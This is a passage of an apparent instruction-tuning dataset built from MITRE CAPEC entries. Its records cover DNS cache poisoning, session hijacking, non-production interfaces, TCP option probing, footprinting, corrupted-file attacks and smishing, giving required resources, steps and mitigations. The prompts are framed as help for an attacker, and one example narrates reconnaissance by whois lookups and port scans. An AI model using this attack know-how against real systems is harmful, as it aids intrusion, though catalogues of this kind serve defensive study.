                "Redirecting Web traffic to a site that looks enough like the original so as to not raise any suspicion.",
                "Adversary-in-the-Middle (CAPEC-94) intercepts secure communication between two parties."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "A DNS cache must be vulnerable to some attack that allows the adversary to replace addresses in its lookup table.Client applications must trust the corrupted cashed values and utilize them for their domain name resolutions."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "To overwrite/modify targeted DNS cache"
          }
        },
        "Resources_Required": {
          "Resource": "The adversary must have the resources to modify the targeted cache. In addition, in most cases the adversary will wish to host the sites to which users will be redirected, although in some cases redirecting to a third party site will accomplish the adversary's goals."
        },
        "Mitigations": {
          "Mitigation": [
            "Configuration: Make sure your DNS servers have been updated to the latest versions",
            "Configuration: UNIX services like rlogin, rsh/rcp, xhost, and nfs are all susceptible to wrong information being held in a cache. Care should be taken with these services so they do not rely upon DNS caches that have been exposed to the Internet.",
            "Configuration: Disable client side DNS caching."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": [
              "In this example, an adversary sends request to a local DNS server to look up www.example .com. The associated IP address of www.example.com is 1.3.5.7.",
              "Local DNS usually caches IP addresses and do not go to remote DNS every time. Since the local record is not found, DNS server tries to connect to remote DNS for queries. However, before the remote DNS returns the right IP address 1.3.5.7, the adversary floods local DNS with crafted responses with IP address 2.4.6.8. The result is that 2.4.6.8 is stored in DNS cache. Meanwhile, 2.4.6.8 is associated with a malicious website www.maliciousexampsle.com",
              "When users connect to www.example.com, the local DNS will direct it to www.maliciousexample.com, this works as part of a Pharming attack."
            ]
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "348"
            },
            {
              "@CWE_ID": "345"
            },
            {
              "@CWE_ID": "349"
            },
            {
              "@CWE_ID": "346"
            },
            {
              "@CWE_ID": "350"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1584.002",
            "Entry_Name": "Compromise Infrastructure: DNS Server"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-22",
              "@Section": "DNS Cache Poisoning"
            },
            {
              "@External_Reference_ID": "REF-23",
              "@Section": "DNS Threats & Weaknesses of the Domain Name System"
            },
            {
              "@External_Reference_ID": "REF-27"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Attack_Phases, Attack_Prerequisites, Description Summary, Examples-Instances, Payload_Activation_Impact, Related_Vulnerabilities, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Related_Weaknesses, Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: Session Hijacking (CAPEC ID: 593)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern Session Hijacking (CAPEC ID: 593):\nThe adversary must have the ability to communicate with the application over the network.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The adversary must have the ability to communicate with the application over the network.",
      "@Name": "Session Hijacking (CAPEC ID: 593)",
      "attack_ptrn": {
        "@ID": "593",
        "@Name": "Session Hijacking",
        "@Abstraction": "Standard",
        "@Status": "Stable",
        "Description": "This type of attack involves an adversary that exploits weaknesses in an application's use of sessions in performing authentication. The adversary is able to steal or manipulate an active session and use it to gain unathorized access to the application.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "21"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Discover Existing Session Token] Through varrying means, an adversary will discover and store an existing session token for some other authenticated user session."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Insert Found Session Token] The attacker attempts to insert a found session token into communication with the targeted application to confirm viability for exploitation."
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Session Token Exploitation] The attacker leverages the captured session token to interact with the targeted application in a malicious fashion, impersonating the victim."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "An application that leverages sessions to perform authentication."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "Exploiting a poorly protected identity token is a well understood attack with many helpful resources available."
          }
        },
        "Resources_Required": {
          "Resource": "The adversary must have the ability to communicate with the application over the network."
        },
        "Consequences": {
          "Consequence": {
            "Scope": [
              "Confidentiality",
              "Integrity",
              "Availability"
            ],
            "Impact": "Gain Privileges",
            "Note": "A successful attack can enable an adversary to gain unauthorized access to an application."
          }
        },
        "Mitigations": {
          "Mitigation": "Properly encrypt and sign identity tokens in transit, and use industry standard session key generation mechanisms that utilize high amount of entropy to generate the session key. Many standard web and application servers will perform this task on your behalf. Utilize a session timeout for all sessions. If the user does not explicitly logout, terminate their session after this period of inactivity. If the user logs back in then a new session key should be generated."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "287"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1185",
              "Entry_Name": "Browser Session Hijacking"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1550.001",
              "Entry_Name": "Use Alternate Authentication Material:Application Access Token"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1563",
              "Entry_Name": "Remote Service Session Hijacking"
            },
            {
              "@Taxonomy_Name": "OWASP Attacks",
              "Entry_Name": "Session hijacking attack"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-603",
            "@Section": "Testing for Session Hijacking"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2017-04-15"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Examples-Instances, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Description, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated References, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: Exploit Non-Production Interfaces (CAPEC ID: 121)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern Exploit Non-Production Interfaces (CAPEC ID: 121):\nFor some interfaces, the adversary will need that appropriate client application or hardware that interfaces with the interface. Other non-production interfaces can be executed using simple tools, such as web browsers or console windows. In some cases, an adversary may need to be able to authenticate to the target before it can access the vulnerable interface.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "For some interfaces, the adversary will need that appropriate client application or hardware that interfaces with the interface. Other non-production interfaces can be executed using simple tools, such as web browsers or console windows. In some cases, an adversary may need to be able to authenticate to the target before it can access the vulnerable interface.",
      "@Name": "Exploit Non-Production Interfaces (CAPEC ID: 121)",
      "attack_ptrn": {
        "@ID": "121",
        "@Name": "Exploit Non-Production Interfaces",
        "@Abstraction": "Standard",
        "@Status": "Stable",
        "Description": {
          "xhtml:p": "An adversary exploits a sample, demonstration, test, or debug interface that is unintentionally enabled on a production system, with the goal of gleaning information or leveraging functionality that would otherwise be unavailable."
        },
        "Extended_Description": {
          "xhtml:p": [
            "Non-production interfaces are insecure by default and should not be resident on production systems, since they may reveal sensitive information or functionality that should not be known to end-users. However, such interfaces may be unintentionally left enabled on a production system due to configuration errors, supply chain mismanagement, or other pre-deployment activities.",
            "Ultimately, failure to properly disable non-production interfaces, in a production environment, may expose a great deal of diagnostic information or functionality to an adversary, which can be utilized to further refine their attack. Moreover, many non-production interfaces do not have adequate security controls or may not have undergone rigorous testing since they were not intended for use in production environments. As such, they may contain many flaws and vulnerabilities that could allow an adversary to severely disrupt a target."
          ]
        },
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "113"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Determine Vulnerable Interface] An adversary explores a target system for sample or test interfaces that have not been disabled by a system administrator and which may be exploitable by the adversary.",
              "Technique": "If needed, the adversary explores an organization's network to determine if any specific systems of interest exist."
            },
            {
              "Step": "2",
              "Phase": "Exploit",
              "Description": "[Leverage Test Interface to Execute Attacks] Once an adversary has discovered a system with a non-production interface, the interface is leveraged to exploit the system and/or conduct various attacks.",
              "Technique": "The adversary can leverage the sample or test interface to conduct several types of attacks such as Adversary-in-the-Middle attacks (CAPEC-94), keylogging, Cross Site Scripting (XSS), hardware manipulation attacks, and more."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The target must have configured non-production interfaces and failed to secure or remove them when brought into a production environment."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "High",
            "#text": "Exploiting non-production interfaces requires significant skill and knowledge about the potential non-production interfaces left enabled in production."
          }
        },
        "Resources_Required": {
          "Resource": "For some interfaces, the adversary will need that appropriate client application or hardware that interfaces with the interface. Other non-production interfaces can be executed using simple tools, such as web browsers or console windows. In some cases, an adversary may need to be able to authenticate to the target before it can access the vulnerable interface."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authentication"
              ],
              "Impact": [
                "Gain Privileges",
                "Bypass Protection Mechanism"
              ]
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": [
                "Read Data",
                "Execute Unauthorized Commands"
              ]
            },
            {
              "Scope": [
                "Access Control",
                "Integrity"
              ],
              "Impact": [
                "Modify Data",
                "Alter Execution Logic"
              ]
            }
          ]
        },
        "Mitigations": {
          "Mitigation": "Ensure that production systems do not contain non-production interfaces and that these interfaces are only used in development environments."
        },
        "Example_Instances": {
          "Example": [
            {
              "xhtml:p": "Some software applications include application programming interfaces (APIs) that are intended to allow an administrator to test and refine their domain. These APIs are typically disabled once a system enters a production environment, but may be left in an insecure state due to a configuration error or mismanagement."
            },
            {
              "xhtml:p": "Many hardware systems leverage bits typically reserved for future functionality for testing and debugging purposes. If these reserved bits remain enabled in a production environment, it could allow an adversary to induce unwanted/unsupported behavior in the hardware."
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "489"
            },
            {
              "@CWE_ID": "1209"
            },
            {
              "@CWE_ID": "1259"
            },
            {
              "@CWE_ID": "1267"
            },
            {
              "@CWE_ID": "1270"
            },
            {
              "@CWE_ID": "1294"
            },
            {
              "@CWE_ID": "1295"
            },
            {
              "@CWE_ID": "1296"
            },
            {
              "@CWE_ID": "1302"
            },
            {
              "@CWE_ID": "1313"
            }
          ]
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-588"
            },
            {
              "@External_Reference_ID": "REF-589"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Activation_Zone, Attack_Phases, Description, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated @Name, @Status, Consequences, Description, Execution_Flow, Mitigations, Prerequisites, References, Related_Weaknesses, Resources_Required, Skills_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Description, Example_Instances, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Execution_Flow, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2023-01-24",
              "Modification_Comment": "Updated Mitigations"
            }
          ],
          "Previous_Entry_Name": [
            {
              "@Date": "2015-12-07",
              "#text": "Locate and Exploit Test APIs"
            },
            {
              "@Date": "2020-07-30",
              "#text": "Exploit Test APIs"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: TCP Options Probe (CAPEC ID: 327)",
    "context": "",
    "output": "The resources required to execute TCP Options Probe (CAPEC ID: 327) are the following: A tool capable of sending and receiving packets from a remote system.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "A tool capable of sending and receiving packets from a remote system.",
      "@Name": "TCP Options Probe (CAPEC ID: 327)",
      "attack_ptrn": {
        "@ID": "327",
        "@Name": "TCP Options Probe",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "This OS fingerprinting probe analyzes the type and order of any TCP header options present within a response segment. Most operating systems use unique ordering and different option sets when options are present. RFC 793 does not specify a required order when options are present, so different implementations use unique ways of ordering or structuring TCP options. TCP options can be generated by ordinary TCP traffic.",
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "312"
          }
        },
        "Prerequisites": {
          "Prerequisite": "The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card."
        },
        "Resources_Required": {
          "Resource": "A tool capable of sending and receiving packets from a remote system."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": [
                "Bypass Protection Mechanism",
                "Hide Activities"
              ]
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "200"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-33",
              "@Section": "Chapter 2: Scanning, pg. 56"
            },
            {
              "@External_Reference_ID": "REF-128"
            },
            {
              "@External_Reference_ID": "REF-212",
              "@Section": "Chapter 8. Remote OS Detection"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Related_Weaknesses"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Footprinting (CAPEC ID: 169), tell me required resources from an attacker",
    "context": "",
    "output": "Sure. Here are the required resources the attacker should have:\nThe adversary requires a variety of tools to collect information about the target. These include port/network scanners and tools to analyze responses from applications to determine version and configuration information. Footprinting a system adequately may also take a few days if the attacker wishes the footprinting attempt to go undetected.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The adversary requires a variety of tools to collect information about the target. These include port/network scanners and tools to analyze responses from applications to determine version and configuration information. Footprinting a system adequately may also take a few days if the attacker wishes the footprinting attempt to go undetected.",
      "@Name": "Footprinting (CAPEC ID: 169)",
      "attack_ptrn": {
        "@ID": "169",
        "@Name": "Footprinting",
        "@Abstraction": "Meta",
        "@Status": "Stable",
        "Description": "An adversary engages in probing and exploration activities to identify constituents and properties of the target.",
        "Extended_Description": {
          "xhtml:p": "Footprinting is a general term to describe a variety of information gathering techniques, often used by attackers in preparation for some attack. It consists of using tools to learn as much as possible about the composition, configuration, and security mechanisms of the targeted application, system or network. Information that might be collected during a footprinting effort could include open ports, applications and their versions, network topology, and similar information. Although similar to fingerprinting, footprinting aims to get a more holistic view of a system or network, whereas fingerprinting is more targeted to a specific application or operating system. While footprinting is not intended to be damaging (although certain activities, such as network scans, can sometimes cause disruptions to vulnerable applications inadvertently) it may often pave the way for more damaging attacks."
        },
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Very Low",
        "Execution_Flow": {
          "Attack_Step": {
            "Step": "1",
            "Phase": "Explore",
            "Description": "[Request Footprinting] The attacker examines the website information and source code of the website and uses automated tools to get as much information as possible about the system and organization.",
            "Technique": [
              "Open Source Footprinting: Examine the website about the organization and skim through the webpage's HTML source to look for comments.",
              "Network Enumeration: Perform various queries (Registrar Query, Organizational Query, Domain Query, Network Query, POC Query) on the many whois databases found on the internet to identify domain names and associated networks.",
              "DNS Interrogation: Once basic information is gathered the attack could begin to query DNS.",
              "Other Techniques: Use ping sweep, TCP scan, UDP scan, OS Identification various techniques to gain more information about the system and network."
            ]
          }
        },
        "Prerequisites": {
          "Prerequisite": "An application must publicize identifiable information about the system or application through voluntary or involuntary means. Certain identification details of information systems are visible on communication networks (e.g., if an adversary uses a sniffer to inspect the traffic) due to their inherent structure and protocol standards. Any system or network that can be detected can be footprinted. However, some configuration choices may limit the useful information that can be collected during a footprinting attack."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "The adversary knows how to send HTTP request, run the scan tool."
          }
        },
        "Resources_Required": {
          "Resource": "The adversary requires a variety of tools to collect information about the target. These include port/network scanners and tools to analyze responses from applications to determine version and configuration information. Footprinting a system adequately may also take a few days if the attacker wishes the footprinting attempt to go undetected."
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Confidentiality",
            "Impact": "Read Data"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Keep patches up to date by installing weekly or daily if possible.",
            "Shut down unnecessary services/ports.",
            "Change default passwords by choosing strong passwords.",
            "Curtail unexpected input.",
            "Encrypt and password-protect sensitive data.",
            "Avoid including information that has the potential to identify and compromise your organization's security such as access to business plans, formulas, and proprietary documents."
          ]
        },
        "Example_Instances": {
          "Example": "In this example let us look at the website http://www.example.com to get much information we can about Alice. From the website, we find that Alice also runs foobar.org. We type in www example.com into the prompt of the Name Lookup window in a tool, and our result is this IP address: 192.173.28.130 We type the domain into the Name Lookup prompt and we are given the same IP. We can safely say that example and foobar.org are hosted on the same box. But if we were to do a reverse name lookup on the IP, which domain will come up? www.example.com or foobar.org? Neither, the result is nijasvspirates.org. So nijasvspirates.org is the name of the box hosting 31337squirrel.org and foobar.org. So now that we have the IP, let's check to see if nijasvspirates is awake. We type the IP into the prompt in the Ping window. We'll set the interval between packets to 1 millisecond. We'll set the number of seconds to wait until a ping times out to 5. We'll set the ping size to 500 bytes and we'll send ten pings. Ten packets sent and ten packets received. nijasvspirates.org returned a message to my computer within an average of 0.35 seconds for every packet sent. nijasvspirates is alive. We open the Whois window and type nijasvspirates.org into the Query prompt, and whois.networksolutions.com into the Server prompt. This means we'll be asking Network Solutions to tell us everything they know about nijasvspirates.org. The result is this laundry list of info: Registrant: FooBar (nijasvspirates -DOM) p.o.box 11111 SLC, UT 84151 US Domain Name: nijasvspirates.ORG Administrative Contact, Billing Contact: Smith, John jsmith@anonymous.net FooBar p.o.box 11111 SLC, UT 84151 555-555-6103 Technical Contact: Johnson, Ken kj@fierymonkey.org fierymonkey p.o.box 11111 SLC, UT 84151 555-555-3849 Record last updated on 17-Aug-2001. Record expires on 11-Aug-2002. Record created on 11-Aug-2000. Database last updated on 12-Dec-2001 04:06:00 EST. Domain servers in listed order: NS1. fierymonkey.ORG 192.173.28.130 NS2. fierymonkey.ORG 64.192.168.80 A corner stone of footprinting is Port Scanning. Let's port scan nijasvspirates.org and see what kind of services are running on that box. We type in the nijasvspirates IP into the Host prompt of the Port Scan window. We'll start searching from port number 1, and we'll stop at the default Sub7 port, 27374. Our results are: 21 TCP ftp 22 TCP ssh SSH-1.99-OpenSSH_2.30 25 TCP smtp 53 TCP domain 80 TCP www 110 TCP pop3 111 TCP sunrpc 113 TCP ident Just by this we know that Alice is running a website and email, using POP3, SUNRPC (SUN Remote Procedure Call), and ident."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "200"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1217",
              "Entry_Name": "Browser Bookmark Discovery"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1592",
              "Entry_Name": "Gather Victim Host Information"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1595",
              "Entry_Name": "Active Scanning"
            }
          ]
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-31"
            },
            {
              "@External_Reference_ID": "REF-32"
            },
            {
              "@External_Reference_ID": "REF-33",
              "@Section": "Chapter 2: Scanning, pp. 38-39"
            },
            {
              "@External_Reference_ID": "REF-34",
              "@Section": "Section 3.1 Introduction, pg. 47"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Description"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Description, Extended_Description, Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: Force Use of Corrupted Files (CAPEC ID: 263)",
    "context": "",
    "output": "The resources required to execute Force Use of Corrupted Files (CAPEC ID: 263) are the following: This varies depending on the resources necessary to corrupt the configuration file and the resources needed to force the application to re-read it (if any).",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "This varies depending on the resources necessary to corrupt the configuration file and the resources needed to force the application to re-read it (if any).",
      "@Name": "Force Use of Corrupted Files (CAPEC ID: 263)",
      "attack_ptrn": {
        "@ID": "263",
        "@Name": "Force Use of Corrupted Files",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "This describes an attack where an application is forced to use a file that an attacker has corrupted. The result is often a denial of service caused by the application being unable to process the corrupted file, but other results, including the disabling of filters or access controls (if the application fails in an unsafe way rather than failing by locking down) or buffer overflows are possible.",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "17"
          }
        },
        "Prerequisites": {
          "Prerequisite": [
            "The targeted application must utilize a configuration file that an attacker is able to corrupt. In some cases, the attacker must be able to force the (re-)reading of the corrupted file if the file is normally only consulted at startup.",
            "The severity of the attack hinges on how the application responds to the corrupted file. If the application detects the corruption and locks down, this may result in the denial of services provided by the application. If the application fails to detect the corruption, the result could be a more severe denial of service (crash or hang) or even an exploitable buffer overflow. If the application detects the corruption but fails in an unsafe way, this attack could result in the continuation of services but without certain security structures, such as filters or access controls. For example, if the corrupted file configures filters, an unsafe response from an application could result in simply disabling the filtering mechanisms due to the lack of usable configuration data."
          ]
        },
        "Resources_Required": {
          "Resource": "This varies depending on the resources necessary to corrupt the configuration file and the resources needed to force the application to re-read it (if any)."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "829"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Mobile Phishing (CAPEC ID: 164), tell me required resources from an attacker",
    "context": "",
    "output": "Sure. Here are the required resources the attacker should have:\nEither mobile phone or access to a web resource that allows text messages to be sent to mobile phones. Resources needed for regular Phishing attack.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Either mobile phone or access to a web resource that allows text messages to be sent to mobile phones. Resources needed for regular Phishing attack.",
      "@Name": "Mobile Phishing (CAPEC ID: 164)",
      "attack_ptrn": {
        "@ID": "164",
        "@Name": "Mobile Phishing",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "An adversary targets mobile phone users with a phishing attack for the purpose of soliciting account passwords or sensitive information from the user. Mobile Phishing is a variation of the Phishing social engineering technique where the attack is initiated via a text or SMS message, rather than email. The user is enticed to provide information or visit a compromised web site via this message. Apart from the manner in which the attack is initiated, the attack proceeds as a standard Phishing attack.",
        "Alternate_Terms": {
          "Alternate_Term": [
            {
              "Term": "Smishing"
            },
            {
              "Term": "MobPhishing"
            }
          ]
        },
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "98"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Obtain domain name and certificate to spoof legitimate site] This optional step can be used to help the adversary impersonate the legitimate site more convincingly. The adversary can use homograph or similar attacks to convince users that they are using the legitimate website. Note that this step is not required for phishing attacks, and many phishing attacks simply supply URLs containing an IP address and no SSL certificate.",
              "Technique": [
                "Optionally obtain a domain name that visually looks similar to the legitimate site's domain name. An example is www.paypaI.com vs. www.paypal.com (the first one contains a capital i, instead of a lower case L)",
                "Optionally obtain a legitimate SSL certificate for the new domain name."
              ]
            },
            {
              "Step": "2",
              "Phase": "Explore",
              "Description": "[Explore legitimate website and create duplicate] An adversary creates a website (optionally at a URL that looks similar to the original URL) that closely resembles the website that they are trying to impersonate. That website will typically have a login form for the victim to put in their authentication credentials. There can be different variations on a theme here.",
              "Technique": [
                "Use spidering software to get copy of web pages on legitimate site.",
                "Manually save copies of required web pages from legitimate site.",
                "Create new web pages that have the legitimate site's look and feel, but contain completely new content."
